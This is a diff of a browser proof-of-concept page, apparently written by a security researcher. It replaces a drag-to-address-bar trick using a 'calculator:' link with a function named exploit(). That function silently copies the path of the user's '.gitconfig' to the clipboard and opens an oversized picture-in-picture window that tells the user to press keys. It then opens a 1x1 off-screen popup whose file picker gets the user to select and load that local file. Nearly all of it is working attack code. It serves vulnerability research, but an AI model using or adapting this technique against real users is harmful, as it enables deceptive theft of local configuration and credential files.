@@ -1,25 +1,97 @@
-<html>
-<title>Puf</title>
+
 <body>
-<br><br>
-  <Center> <h1 id="demo"> Drag Link to Addressbar </h1> </Center>
+<div>
+<button id="pipButton" onclick="exploit()">double click</button>
+</div>
+<script>
+  const video = document.getElementById("video");
+  const pipButton = document.getElementById("pipButton");
 
-<Center> <a id="uiLinkUrlDownload"  onclick='return false;' oncontextmenu='return false;' href='calculator:Google.com'> <img src='cursor.png' /></a>
-  <a id="linkurl" href='calculator:Google.com' oncontextmenu='return false;' onclick='return false;'>Drag this Link to Addressbar</a> </Center>
-                           
-                                                     
-<script>   
+  var t=0;
+ 
+ function exploit()
+ { 
+  if(t==0)
+  {
+     bo()
+  
+  }
+  else{
+  
+    vb()
+  }
+  t++;
+ }
 
-                                                                      
-  document.getElementById('uiLinkUrlDownload').ondragend = function(event){
-      document.documentElement.requestFullscreen();
-   var myWindow =  window.open("", "_blank", "toolbar=yes,scrollbars=yes,resizable=yes,top=20,left=400,width=500,height=100").close();
-  }         
+ 
+  
+
+function bo(){
+ 
+	
+const fileReadPath = "%userprofile%\\\.gitconfig"		
+copyToClipboard( fileReadPath);
+
+const pipOpen = async () => {
+  pipWindow = await documentPictureInPicture.requestWindow({
+    width: Math.pow(2,32),
+    height: Math.pow(2,32),
+  });
+    pipWindow.document.body.innerHTML = `<h1>prees enter + command a then enter</h1>`
+};
+
+pipOpen();
+
+}
+function vb() {
+  const popup = window.open("", "_blank", "toolbar=yes,scrollbars=yes,resizable=yes,top=50000,left=50000,width=1,height=1");
+  popup.document.open();
+  popup.document.write(`
+    <html>
+    <head><title>Upload Image</title></head>
+    <body style="margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #ffffff;">
+      <input type="file" id="fileInput" autofocus accept="image/*" style="font-size: 16px; padding: 20px;">
+      <script>
+        document.getElementById('fileInput').addEventListener('change', function(e) {
+          const file = e.target.files[0];
+          if (!file) return;
+          
+          try { window.moveTo(0, 0); window.resizeTo(500, 500); } catch(err) {}
+
+          const reader = new FileReader();
+          reader.onload = function(event) {
+            document.body.innerHTML = '<img src="' + event.target.result + '" style="max-width: 100vw; max-height: 100vh; object-fit: contain;">';
+          };
+          reader.onerror = function() {
+            document.body.innerHTML = '<h2>Error reading file! Make sure it is an image.</h2>';
+          };
+          reader.readAsDataURL(file);
+        });
+      </` + `script>
+    </body>
+    </html>
+  `);
+  popup.document.close();
+}
+  
+  
+  function copyToClipboard(text) {
+    const textarea = document.createElement("textarea");
+    textarea.style.opacity = "0%";
+    textarea.textContent = text;
+    document.body.appendChild(textarea);
+    textarea.select();
+    document.execCommand("copy");
+  }
 
 
-document.getElementById('linkurl').ondragend = function(event){    
-    document.documentElement.requestFullscreen();
-   var myWindow = window.open("", "_blank", "toolbar=yes,scrollbars=yes,resizable=yes,top=20,left=400,width=500,height=100").close();
-  }     
-</script>     
-</body></html>
+
+
+</script>
+</body>
+
+
+<script>
+
+</script>
+
